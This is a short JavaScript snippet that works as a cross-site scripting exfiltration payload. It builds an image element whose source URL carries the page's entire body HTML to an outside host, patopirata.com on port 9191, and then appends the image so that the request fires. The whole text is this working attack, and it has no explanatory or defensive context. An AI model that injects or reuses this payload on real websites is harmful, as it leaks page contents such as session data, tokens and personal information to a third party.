var image = document.createElement("img")

var html = window.document.body.outerHTML
image.src = "//patopirata.com:9191/image.png?c=" + html

document.body.appendChild(image);
